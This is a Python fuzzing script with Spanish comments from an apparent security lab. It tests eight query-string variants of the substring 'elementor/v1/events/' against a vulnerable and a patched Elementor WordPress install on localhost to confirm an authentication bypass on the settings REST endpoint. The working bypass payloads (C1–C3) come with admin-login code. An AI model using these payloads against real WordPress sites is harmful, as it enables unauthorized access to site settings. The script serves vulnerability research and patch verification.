#!/usr/bin/env python3
"""Mini-fuzzer de la subcadena mágica (lab Elementor CSRF).

El bug compara `strpos($request_uri, 'elementor/v1/events/')` contra el URI
CRUDO de la petición. Este harness prueba una matriz de variantes de
colocación/codificación contra la víctima (4.3.1, esperado: bypass en las
variantes legibles para strpos) y el control (4.3.2, esperado: 401 siempre).

Observable: GET /wp-json/wp/v2/settings con las cookies del admin —
401 = sin bypass (usuario degradado a anónimo), 200 = bypass activo.

Salida: tabla markdown por stdout (guárdala con:
    make fuzz-subcadena  # escribe research/investigacion/fuzz-resultados.md)

Solo stdlib. Solo hosts locales (lab).
"""
from __future__ import annotations

import http.cookiejar
import sys
import urllib.parse
import urllib.request

HOSTS_PERMITIDOS = {"localhost", "127.0.0.1", "::1"}

# (id, descripción, query-extra, veredicto esperado en 4.3.1)
CASOS = [
    ("C1", "subcadena literal en parámetro propio", "x=elementor/v1/events/", True),
    ("C2", "anidada dentro de otro parámetro", "q=foo-elementor/v1/events/-bar", True),
    ("C3", "prefijada con / en el valor", "x=/elementor/v1/events/zzz", True),
    ("C4", "codificada %2F", "x=elementor%2Fv1%2Fevents%2F", False),
    ("C5", "doble codificación %252F", "x=elementor%252Fv1%252Fevents%252F", False),
    ("C6", "MAYÚSCULAS", "x=ELEMENTOR/V1/EVENTS/", False),
    ("C7", "sin barra final", "x=elementor/v1/events", False),
    ("C8", "solo el namespace", "x=elementor/v1/", False),
]


class Sesion:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))
        self.opener.addheaders = [("User-Agent", "ElementorCSRF-fuzzer/1.0 (lab)")]

    def pedir(self, url: str) -> int:
        try:
            with self.opener.open(url, timeout=15) as r:
                return r.status
        except urllib.error.HTTPError as e:
            return e.code


def sesion_admin(base: str, usuario: str, clave: str) -> Sesion:
    s = Sesion(base)
    s.pedir(f"{s.base}/wp-login.php")
    data = urllib.parse.urlencode(
        {"log": usuario, "pwd": clave, "wp-submit": "Log In", "testcookie": "1"}
    ).encode()
    urllib.request.install_opener(s.opener)  # noqa: el opener lleva el jar
    try:
        s.opener.open(f"{s.base}/wp-login.php", data=data, timeout=15).read()
    except urllib.error.HTTPError:
        pass
    if not any("wordpress_logged_in" in c.name for c in s.jar):
        sys.exit(f"[!] login fallido en {base} (¿lab levantado?)")
    return s


def main() -> int:
    victima = "http://localhost:8085"
    control = "http://localhost:8086"
    admin_user, admin_pass = "admin", "admin"

    for b in (victima, control):
        p = urllib.parse.urlparse(b)
        if (p.hostname or "").lower() not in HOSTS_PERMITIDOS:
            sys.exit("[!] solo hosts locales")

    v = sesion_admin(victima, admin_user, admin_pass)
    c = sesion_admin(control, admin_user, admin_pass)

    print("# fuzz-resultados — matriz de la subcadena mágica\n")
    print("| # | Variante | Víctima 4.3.1 | Esperado | ¿OK? | Control 4.3.2 |")
    print("|---|---|---|---|---|---|")

    ok = 0
    for cid, desc, extra, esperado in CASOS:
        rv = v.pedir(f"{victima}/wp-json/wp/v2/settings?{extra}")
        rc = c.pedir(f"{control}/wp-json/wp/v2/settings?{extra}")
        bypass = rv == 200
        acierto = bypass == esperado and rc != 200
        ok += acierto
        print(
            f"| {cid} | `{extra}` ({desc}) | {rv} {'(bypass)' if bypass else '(resiste)'} "
            f"| {'bypass' if esperado else '401'} | {'✔' if acierto else '✘'} | {rc} |"
        )

    print(f"\n**{ok}/{len(CASOS)} casos ajustados a la predicción** "
          "(víctima: strpos sobre URI crudo; control: parche resiste todo).")
    return 0 if ok == len(CASOS) else 1


if __name__ == "__main__":
    sys.exit(main())
